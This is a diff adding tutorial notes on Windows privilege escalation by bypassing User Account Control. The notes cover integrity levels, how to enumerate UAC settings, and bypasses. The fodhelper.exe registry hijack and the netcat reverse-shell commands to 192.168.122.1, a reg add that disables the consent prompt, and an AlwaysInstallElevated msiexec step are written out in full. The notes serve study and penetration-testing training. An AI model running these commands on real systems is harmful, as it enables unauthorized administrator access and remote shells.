@@ -1,0 +1,322 @@
+                     ______________________________
+
+                      WINDOWS PRIVILEGE ESCALATION
+                      User Account Control Bypass
+
+                            Leonardo Tamiano
+                     ______________________________
+
+
+Table of Contents
+_________________
+
+1. User Account Control (UAC)
+2. Mandatory Integrity Control (MIC)
+3. Relationship between UAC and MIC
+4. Enumerate UAC Configuration
+5. UAC Bypass
+.. 1. sigcheck.exe
+.. 2. Level 0 - easy
+.. 3. Level 5 - fodhelper.exe
+.. 4. Level 1,2,3,4 - Always Install Elevated
+6. References
+
+
+1 User Account Control (UAC)
+============================
+
+  UAC is a feature that helps manage when and how applications run with
+  elevated privileges. It requires users to explicitly authorize or
+  authenticate before a process can gain elevated permissions.
+
+  Application are started with the least privileges needed, which is
+  typically a medium integrity level, even for logged in as an
+  administrator.
+
+  Then, when an application requests higher integrity levels, a prompt
+  is used to ask for confirmation.
+
+  UAC can have different configuration levels:
+
+  ,----
+  | 0 -> no prompt
+  | 1 -> prompt for credentials on the secure desktop
+  | 2 -> prompt for consent on the secure desktop
+  | 3 -> prompt for credentials on the normal desktop
+  | 4 -> prompt for consent on the normal desktop
+  | 5 -> prompt for consent for non-windows binaries
+  `----
+
+  Notice here the difference between `secure desktop' and `normal
+  desktop'
+
+  - *Secure Desktop* (Level 1, Level 2)
+
+    Provide a levle of isolation from all other running applications to
+    prevent malicious software from interacting with the UAC prompt.
+
+    The Secure Desktop provides an added layer of security, ensuring
+    that only trusted system processes (like UAC) can run on it
+
+  - *Normal Desktop* (Level 3, Level 4)
+
+    The Normal Desktop allows other programs and windows to remain
+    active and interact with the user while the UAC prompt is
+    on-screen. This is less secure because other applications can
+    potentially interact with or manipulate the UAC dialog.
+
+
+2 Mandatory Integrity Control (MIC)
+===================================
+
+  MIC is a core security that uses integrity levels to enforce access
+  control policies that limit the interactions between processes of
+  different privilege levels.
+
+  MIC enforces restrictions by preventing lower-integrity processes from
+  writing to or modifying higher-integrity objects.
+
+  There are four levels in MIC:
+
+  - Low
+  - Medium
+  - High
+  - System
+
+
+3 Relationship between UAC and MIC
+==================================
+
+  MIC and UAC work together to restrict unauthorized access and manage
+  privilege escalation.
+
+  - MIC provides the underlying enforcement mechanism for integrity
+    levels, while UAC provides the user interface that prompts users to
+    approve or deny elevation requests.
+
+  - When a standard application attempts to perform an action that
+    requires elevated privileges, UAC triggers a prompt. If the user
+    consents, the process's integrity level is elevated from medium to
+    high.
+
+  To recap
+
+  - *MIC* enforces a policy-based boundary based on integrity levels
+
+  - *UAC* controls how and when processes can cross that boundary
+
+
+4 Enumerate UAC Configuration
+=============================
+
+  To check if UAC is enabled, you can use the following commands
+
+  ,----
+  | PS C:\> Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA
+  | C:\> reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+  `----
+
+  If you get a 1, then UAC is enabled. Otherwise is disabled.
+
+  ,----
+  | PS C:\Users\Quickemu\Downloads> Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA
+  | 
+  | EnableLUA
+  | ---------
+  |         1
+  `----
+
+  ----------------------------------------------------------------------
+
+  To actually check your specific configuration level instead you can
+  use
+
+  ,----
+  | PS C:\> Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | Select-Object ConsentPromptBehaviorAdmin
+  `----
+
+  In our case
+
+  ,----
+  | PS C:\Users\Quickemu\Downloads> Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | Select-Object ConsentPromptBehaviorAdmin
+  | 
+  | ConsentPromptBehaviorAdmin
+  | --------------------------
+  |                          0
+  `----
+
+  ----------------------------------------------------------------------
+
+  To set a new UAC level, you can do
+
+  ,----
+  | reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f
+  `----
+
+
+5 UAC Bypass
+============
+
+  Certain executables signed by Microsoft can be used to bypass UAC,
+  since they are started with higher integrity levels if the user
+  executing them belongs to the administrator group.
+
+  ,----
+  | Start-Process -FilePath "powershell.exe" -Verb RunAs
+  `----
+
+  ,----
+  | reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
+  `----
+
+
+5.1 sigcheck.exe
+~~~~~~~~~~~~~~~~
+
+  To check if a binary starts as `autoelevated automatically' you can
+  use the `sigcheck.exe' utility from Sysinternals to read the
+  `Manifest' of the binary.
+
+  ,----
+  | .\Sigcheck\sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+  `----
+
+  Manifest of fodhelper.exe
+  ,----
+  | C:\Users\Quickemu\Downloads>.\Sigcheck\sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+  | 
+  | Sigcheck v2.90 - File version and signature viewer
+  | Copyright (C) 2004-2022 Mark Russinovich
+  | Sysinternals - www.sysinternals.com
+  | 
+  | c:\windows\system32\fodhelper.exe:
+  |         Verified:       Signed
+  |         Signing date:   02:16 05/10/2024
+  |         Publisher:      Microsoft Windows
+  |         Company:        Microsoft Corporation
+  |         Description:    Features On Demand Helper
+  |         Product:        Microsoft« Windows« Operating System
+  |         Prod version:   10.0.22621.4249
+  |         File version:   10.0.22621.4249 (WinBuild.160101.0800)
+  |         MachineType:    64-bit
+  |         Binary Version: 10.0.22621.4249
+  |         Original Name:  FodHelper.EXE
+  |         Internal Name:  FodHelper
+  |         Copyright:      ® Microsoft Corporation. All rights reserved.
+  |         Comments:       n/a
+  |         Entropy:        4.803
+  |         Manifest:
+  `----
+
+  ,----
+  | <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+  | <!-- Copyright (c) Microsoft Corporation -->
+  | <assembly
+  |    xmlns="urn:schemas-microsoft-com:asm.v1"
+  |    xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
+  |    manifestVersion="1.0">
+  |  <assemblyIdentity type="win32" publicKeyToken="6595b64144ccf1df" name="Microsoft.Windows.FodHelper" version="5.1.0.0" processorArchitecture="amd64"/>
+  |  <description>Features On Demand Helper UI</description>
+  |  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+  |   <security>
+  |       <requestedPrivileges>
+  |           <requestedExecutionLevel
+  |             level="requireAdministrator"
+  |           />
+  |       </requestedPrivileges>
+  |   </security>
+  |  </trustInfo>
+  |  <asmv3:application>
+  |     <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
+  |         <dpiAware>true</dpiAware>
+  |         <autoElevate>true</autoElevate>
+  |     </asmv3:windowsSettings>
+  |  </asmv3:application>
+  | </assembly>
+  `----
+
+
+5.2 Level 0 - easy
+~~~~~~~~~~~~~~~~~~
+
+  In this level, there is nothing to bypass, you can simply spawn a
+  process at a higher integrity level as follows
+
+  ,----
+  | Start-Process -FilePath "C:\Users\Quickemu\Downloads\nc64.exe" -ArgumentList "192.168.122.1 4321 -e cmd.exe" -Verb RunAs -WindowStyle Hidden
+  `----
+
+  If you belong to an administrator group, then you will get access to
+  your full administrator powers.
+
+  Notice that doing `Start-Process' is different from simply starting a
+  process directly, since integrity level are inherited from parent
+  processes, unless started explicitly with `Start-Process'.
+
+  The command options `-Verb RunAs' is used for requesting elevation of
+  integrity levels and it makes sure that the new process will be
+  started with a higher integrity level.
+
+
+5.3 Level 5 - fodhelper.exe
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  Let's say we have a level of UAC that is level 5.
+
+  We can use the Windows Utility `Features on Demand' (FoD) to bypass
+  the UAC prompt. Specifically, Windows treat the `fodhelper.exe' as a
+  trusted system application, and so it runs it with `high integrity'
+  without triggering a UAC prompt.
+
+  The attack works in two steps:
+
+  1. In the first step the attacker modifies the `Registry' in order to
+     configure the malicious command that will be run with high
+     integrity levels.
+
+  2. In the second step, the `fodhelper.exe' binary is executed.
+
+  ----------------------------------------------------------------------
+
+  In practice, first we create the registry item
+
+  ,----
+  | New-Item -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Force
+  `----
+
+  Then we configure it with the malicious values to execue a `cmd.exe'
+
+  ,----
+  | Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(Default)' -Value 'cmd.exe' -Type String
+  | Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Type String
+  `----
+
+  To execute a reverse shell
+
+  ,----
+  | Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(Default)' -Value 'C:\Users\Quickemu\Downloads\nc64.exe 192.168.122.1 4321 -e cmd.exe' -Type String
+  `----
+
+
+5.4 Level 1,2,3,4 - Always Install Elevated
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  If the `Always Install Elevated' configuration is enabled, it is
+  possible to trigger arbitrary code as the system account during the
+  installation of malicious `.msi' packages.
+
+  ,----
+  | msiexec /quiet /qn /i sample2.msi
+  `----
+
+  This will bypass any UAC levels.
+
+
+6 References
+============
+
+  Hack Tricks, UAC - User Account Control
+  <https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control>
+
+  By Pass UAC Using Fodhelper
+  <https://nadimsaliby.medium.com/by-pass-uac-using-fodhelper-e4a94e04d5f0>
